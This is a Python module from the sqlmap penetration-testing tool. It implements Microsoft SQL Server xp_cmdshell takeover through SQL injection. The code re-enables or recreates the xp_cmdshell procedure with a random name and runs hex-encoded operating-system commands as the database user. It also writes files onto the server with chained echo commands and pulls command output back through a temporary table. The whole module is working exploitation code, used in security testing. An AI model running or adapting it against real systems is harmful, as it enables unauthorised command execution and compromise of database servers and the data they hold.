#!/usr/bin/env python

"""
Copyright (c) 2006-2012 sqlmap developers (http://www.sqlmap.org/)
See the file 'doc/COPYING' for copying permission
"""

from lib.core.agent import agent
from lib.core.common import Backend
from lib.core.common import getLimitRange
from lib.core.common import getSPQLSnippet
from lib.core.common import hashDBWrite
from lib.core.common import isListLike
from lib.core.common import isNoneValue
from lib.core.common import isNumPosStrValue
from lib.core.common import isTechniqueAvailable
from lib.core.common import pushValue
from lib.core.common import popValue
from lib.core.common import randomStr
from lib.core.common import readInput
from lib.core.common import wasLastRequestDelayed
from lib.core.convert import hexencode
from lib.core.data import conf
from lib.core.data import kb
from lib.core.data import logger
from lib.core.enums import CHARSET_TYPE
from lib.core.enums import DBMS
from lib.core.enums import EXPECTED
from lib.core.enums import HASHDB_KEYS
from lib.core.enums import PAYLOAD
from lib.core.exception import sqlmapUnsupportedFeatureException
from lib.core.threads import getCurrentThreadData
from lib.core.unescaper import unescaper
from lib.request import inject

class xp_cmdshell:
    """
    This class defines methods to deal with Microsoft SQL Server
    xp_cmdshell extended procedure for plugins.
    """

    def __init__(self):
        self.xpCmdshellStr = "master..xp_cmdshell"

    def __xpCmdshellCreate(self):
        cmd = ""

        if Backend.isVersionWithin(("2005", "2008")):
            logger.debug("activating sp_OACreate")

            cmd = getSPQLSnippet(DBMS.MSSQL, "activate_sp_oacreate")
            inject.goStacked(agent.runAsDBMSUser(cmd))

        self.__randStr = randomStr(lowercase=True)
        self.__xpCmdshellNew = "xp_%s" % randomStr(lowercase=True)
        self.xpCmdshellStr = "master..%s" % self.__xpCmdshellNew

        cmd = getSPQLSnippet(DBMS.MSSQL, "create_new_xp_cmdshell", RANDSTR=self.__randStr, XP_CMDSHELL_NEW=self.__xpCmdshellNew)

        if Backend.isVersionWithin(("2005", "2008")):
            cmd += ";RECONFIGURE WITH OVERRIDE"

        inject.goStacked(agent.runAsDBMSUser(cmd))

    def __xpCmdshellConfigure2005(self, mode):
        debugMsg = "configuring xp_cmdshell using sp_configure "
        debugMsg += "stored procedure"
        logger.debug(debugMsg)

        cmd = getSPQLSnippet(DBMS.MSSQL, "configure_xp_cmdshell", ENABLE=str(mode))

        return cmd

    def __xpCmdshellConfigure2000(self, mode):
        debugMsg = "configuring xp_cmdshell using sp_addextendedproc "
        debugMsg += "stored procedure"
        logger.debug(debugMsg)

        if mode == 1:
            cmd = getSPQLSnippet(DBMS.MSSQL, "enable_xp_cmdshell_2000", ENABLE=str(mode))
        else:
            cmd = getSPQLSnippet(DBMS.MSSQL, "disable_xp_cmdshell_2000", ENABLE=str(mode))

        return cmd

    def __xpCmdshellConfigure(self, mode):
        if Backend.isVersionWithin(("2005", "2008")):
            cmd = self.__xpCmdshellConfigure2005(mode)
        else:
            cmd = self.__xpCmdshellConfigure2000(mode)

        inject.goStacked(agent.runAsDBMSUser(cmd))

    def __xpCmdshellCheck(self):
        cmd = "ping -n %d 127.0.0.1" % (conf.timeSec * 2)
        self.xpCmdshellExecCmd(cmd)

        return wasLastRequestDelayed()

    def __xpCmdshellTest(self):
        threadData = getCurrentThreadData()
        pushValue(threadData.disableStdOut)
        threadData.disableStdOut = True

        logger.info("testing if xp_cmdshell extended procedure is usable")
        output = self.evalCmd("echo 1")

        if isNoneValue(output):
            errMsg = "it seems that the temporary directory ('%s') used for " % self.getRemoteTempPath()
            errMsg += "storing console output within the back-end file system "
            errMsg += "does not have writing permissions for the DBMS process. "
            errMsg += "You are advised to manually adjust it with option "
            errMsg += "--tmp-path switch or you will not be able to retrieve "
            errMsg += "the commands output"
            logger.error(errMsg)
        else:
            logger.info("xp_cmdshell extended procedure is usable")

        threadData.disableStdOut = popValue()

    def xpCmdshellWriteFile(self, fileContent, tmpPath, randDestFile):
        echoedLines = []
        cmd = ""
        charCounter = 0
        maxLen = 512

        if isinstance(fileContent, (set, list, tuple)):
            lines = fileContent
        else:
            lines = fileContent.split("\n")

        for line in lines:
            echoedLine = "echo %s " % line
            echoedLine += ">> \"%s\%s\"" % (tmpPath, randDestFile)
            echoedLines.append(echoedLine)

        for echoedLine in echoedLines:
            cmd += "%s & " % echoedLine
            charCounter += len(echoedLine)

            if charCounter >= maxLen:
                self.xpCmdshellExecCmd(cmd)

                cmd = ""
                charCounter = 0

        if cmd:
            self.xpCmdshellExecCmd(cmd)

    def xpCmdshellForgeCmd(self, cmd, insertIntoTable=None):
        self.__randStr = randomStr(lowercase=True)
        self.__cmd = "0x%s" % hexencode(cmd)
        self.__forgedCmd = "DECLARE @%s VARCHAR(8000);" % self.__randStr
        self.__forgedCmd += "SET @%s=%s;" % (self.__randStr, self.__cmd)
        if insertIntoTable:
            self.__forgedCmd += "INSERT INTO %s " % insertIntoTable
        self.__forgedCmd += "EXEC %s @%s" % (self.xpCmdshellStr, self.__randStr)

        return agent.runAsDBMSUser(self.__forgedCmd)

    def xpCmdshellExecCmd(self, cmd, silent=False):
        cmd = self.xpCmdshellForgeCmd(cmd)
        return inject.goStacked(cmd, silent)

    def xpCmdshellEvalCmd(self, cmd, first=None, last=None):
        if conf.direct:
            output = self.xpCmdshellExecCmd(cmd)

            if output and isinstance(output, (list, tuple)):
                new_output = ""

                for line in output:
                    if line == "NULL":
                        new_output += "\n"
                    else:
                        new_output += "%s\n" % line.strip("\r")

                output = new_output
        else:
            inject.goStacked(self.xpCmdshellForgeCmd(cmd, self.cmdTblName))
            query = "SELECT %s FROM %s" % (self.tblField, self.cmdTblName)
            if any(isTechniqueAvailable(_) for _ in (PAYLOAD.TECHNIQUE.UNION, PAYLOAD.TECHNIQUE.ERROR)) or conf.direct:
                output = inject.getValue(query, resumeValue=False, blind=False)
            else:
                output = []
                count = inject.getValue("SELECT COUNT(*) FROM %s" % self.cmdTblName, resumeValue=False, inband=False, error=False, expected=EXPECTED.INT, charsetType=CHARSET_TYPE.DIGITS)
                if isNumPosStrValue(count):
                    for index in getLimitRange(count):
                        query = agent.limitQuery(index, query, self.tblField)
                        output.append(inject.getValue(query, inband=False, error=False, resumeValue=False))
            inject.goStacked("DELETE FROM %s" % self.cmdTblName)

            if output and isListLike(output) and len(output) > 1:
                if not output[0].strip():
                    output = output[1:]
                elif not output[-1].strip():
                    output = output[:-1]

        return output

    def xpCmdshellInit(self):
        if not kb.xpCmdshellAvailable:
            infoMsg = "checking if xp_cmdshell extended procedure is "
            infoMsg += "available, please wait.."
            logger.info(infoMsg)

            result = self.__xpCmdshellCheck()

            if result:
                logger.info("xp_cmdshell extended procedure is available")
                kb.xpCmdshellAvailable = True

            else:
                message = "xp_cmdshell extended procedure does not seem to "
                message += "be available. Do you want sqlmap to try to "
                message += "re-enable it? [Y/n] "
                choice = readInput(message, default="Y")

                if not choice or choice in ("y", "Y"):
                    self.__xpCmdshellConfigure(1)

                    if self.__xpCmdshellCheck():
                        logger.info("xp_cmdshell re-enabled successfully")
                        kb.xpCmdshellAvailable = True

                    else:
                        logger.warn("xp_cmdshell re-enabling failed")

                        logger.info("creating xp_cmdshell with sp_OACreate")
                        self.__xpCmdshellConfigure(0)
                        self.__xpCmdshellCreate()

                        if self.__xpCmdshellCheck():
                            logger.info("xp_cmdshell created successfully")
                            kb.xpCmdshellAvailable = True

                        else:
                            warnMsg = "xp_cmdshell creation failed, probably "
                            warnMsg += "because sp_OACreate is disabled"
                            logger.warn(warnMsg)

            hashDBWrite(HASHDB_KEYS.KB_XP_CMDSHELL_AVAILABLE, kb.xpCmdshellAvailable)

            if not kb.xpCmdshellAvailable:
                errMsg = "unable to proceed without xp_cmdshell"
                raise sqlmapUnsupportedFeatureException, errMsg

        debugMsg = "creating a support table to write commands standard "
        debugMsg += "output to"
        logger.debug(debugMsg)

        # TEXT can't be used here because in error technique you get:
        # "The text, ntext, and image data types cannot be compared or sorted"
        self.createSupportTbl(self.cmdTblName, self.tblField, "NVARCHAR(4000)")

        self.__xpCmdshellTest()
